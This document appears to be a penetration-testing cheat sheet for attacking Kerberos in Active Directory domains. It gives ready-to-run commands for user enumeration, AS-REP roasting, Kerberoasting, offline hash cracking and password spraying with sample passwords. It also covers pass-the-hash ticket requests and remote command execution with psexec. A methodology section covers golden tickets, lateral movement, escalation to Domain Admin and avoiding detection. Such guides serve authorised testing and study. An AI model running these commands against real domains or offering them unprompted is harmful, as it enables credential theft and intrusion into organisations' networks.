# Kerberos Enumeration (88)

## Run nmap Kerberos scripts
```bash
nmap -p 88 --script=krb5-enum-users,krb5-realm $IP
```

## Check Kerberos service with UDP and TCP
```bash
nmap -sU -sS -p 88 $IP
```

## Enumerate domain users with netexec
```bash
netexec smb $IP -u '' -p '' --users
```

## Enumerate users with rpcclient
```bash
rpcclient -U "" -N $IP -c enumdomusers
```

## Enumerate usernames with kerbrute
```bash
kerbrute userenum -d domain.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

## Check for ASREPRoastable users with impacket
```bash
impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
```

## Request ASREPRoast hashes for specific user
```bash
impacket-GetNPUsers domain.local/username -dc-ip $IP -no-pass
```

## ASREPRoast with netexec
```bash
netexec ldap $IP -u users.txt -p '' --asreproast asrep_hashes.txt
```

## Crack ASREPRoast hashes
```bash
# hashcat (GPU, faster) OR john (CPU)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Request Kerberoast TGS tickets with impacket
```bash
impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
```

## Kerberoast with netexec
```bash
netexec ldap $IP -u username -p password --kerberoasting kerberoast_hashes.txt
```

## Crack Kerberoast hashes
```bash
# hashcat (GPU, faster) OR john (CPU)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Password spray with netexec
```bash
netexec smb $IP -u users.txt -p 'Password123!' --continue-on-success
```

## Password spray with kerbrute
```bash
kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
```

## Request TGT with NTLM hash
```bash
impacket-getTGT domain.local/username -hashes :ntlm_hash
```

## Use Kerberos ticket for authentication
```bash
export KRB5CCNAME=username.ccache
```

## Execute commands with Kerberos ticket
```bash
impacket-psexec domain.local/username@target.domain.local -k -no-pass
```

---

# Kerberos Enumeration Methodology

## Initial Reconnaissance

1. Identify Kerberos service on port 88
2. Enumerate domain users (via SMB, LDAP, or RPC)
3. Check for ASREPRoastable users (no preauth required)
4. Attempt password spraying with common passwords
5. If credentials obtained, perform Kerberoasting
6. Crack obtained hashes offline

## ASREPRoasting Attack

**What is ASREPRoasting:**
Targets user accounts with "Do not require Kerberos preauthentication" enabled. This misconfiguration allows attackers to request authentication data for these users without a password, which can then be cracked offline.

**Attack workflow:**
1. Enumerate users (kerbrute, netexec, or rpcclient)
2. Test users for ASREPRoastable accounts (GetNPUsers)
3. Collect AS-REP hashes
4. Crack hashes with hashcat or john

**No credentials needed:** ASREPRoasting works without any domain credentials.

## Kerberoasting Attack

**What is Kerberoasting:**
Targets service accounts with Service Principal Names (SPNs). Authenticated users can request TGS tickets for services, which are encrypted with the service account's password hash. These tickets can be cracked offline.

**Attack workflow:**
1. Obtain valid domain credentials (any user)
2. Query for accounts with SPNs (GetUserSPNs)
3. Request TGS tickets for those services
4. Crack tickets offline to recover service account passwords

**Requires credentials:** Unlike ASREPRoasting, Kerberoasting needs valid domain user credentials.

## Username Enumeration

**kerbrute:** Fast, uses Kerberos pre-authentication to validate usernames without triggering account lockouts.

**netexec/rpcclient:** Enumerate via SMB/RPC null sessions if allowed.

**enum4linux-ng:** Comprehensive enumeration if null sessions work.

**Common username wordlists:**
- /usr/share/wordlists/seclists/Usernames/Names/names.txt
- /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

## Password Spraying

**Best practices:**
- Use one password against many users (not many passwords against one user)
- Common passwords: Password123!, Welcome123!, Summer2024!, CompanyName2024!
- Monitor for account lockouts
- Space out attempts to avoid detection

**Tools:**
- kerbrute: Fast and less likely to trigger lockouts
- netexec: Supports continue-on-success for comprehensive testing

## Hash Cracking

**ASREPRoast hashes (mode 18200):**
Format: krb5asrep
Faster to crack than Kerberoast hashes

**Kerberoast hashes (mode 13100):**
Format: krb5tgs
May take longer depending on password complexity

**Optimization:**
- Use GPU for cracking (hashcat)
- Start with common passwords and rules
- Use targeted wordlists based on company/domain name

## Pass-the-Ticket Attacks

Once you have a valid TGT (Ticket Granting Ticket):
1. Export KRB5CCNAME environment variable
2. Use -k flag with impacket tools
3. Authenticate without knowing the password

## Overpass-the-Hash

If you have NTLM hash but not plaintext password:
1. Request TGT with hash using getTGT
2. Use resulting ticket for authentication
3. Effective privilege escalation technique

## Golden Ticket Attack

If krbtgt hash is obtained (requires Domain Admin):
1. Create forged TGT with ticketer
2. Grant yourself any privileges
3. Access any resource in the domain
4. Persistence mechanism (tickets valid until krbtgt password changed)

## Common Kerberos Misconfigurations

1. **Users with "Do not require Kerberos preauthentication"**
2. **Service accounts with weak passwords**
3. **Service accounts with Domain Admin privileges**
4. **Unconstrained delegation on computers**
5. **Constrained delegation misconfigurations**
6. **RC4 encryption enabled (weak)**

## Attack Checklist Priority

1. Username enumeration (kerbrute)
2. ASREPRoasting (no creds needed)
3. Password spraying (common passwords)
4. Kerberoasting (if creds obtained)
5. Hash cracking
6. Ticket-based attacks (PTH, PTT)

## Next Steps

Once Kerberos attacks succeed:
1. Use cracked credentials for lateral movement
2. Check for delegation opportunities
3. Extract additional tickets from compromised systems
4. Escalate to Domain Admin if possible
5. Enumerate trusts for cross-domain attacks

---

# References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- https://github.com/GhostPack/Rubeus
- https://github.com/SecureAuthCorp/impacket
- https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
